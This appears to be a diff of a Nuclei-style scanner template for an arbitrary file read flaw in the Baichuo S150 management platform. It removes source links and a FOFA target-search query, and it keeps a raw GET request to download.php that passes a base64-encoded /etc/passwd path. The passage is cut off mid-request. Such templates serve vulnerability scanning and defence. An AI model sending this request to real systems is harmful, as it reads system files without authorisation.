@@ -3,12 +3,8 @@ info:
   name: 北京百绰智能S150管理平台download.php任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkn7v173p1no1gqi'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rkn7v173p1no1gqi
-    fofa: title="smart--管理平台"
 http:
 - raw:
   - 'GET /log/download.php?local=yes&type=filedown&file=L2V0Yy9wYXNzd2Q=&filename=passwd HTTP/1.1
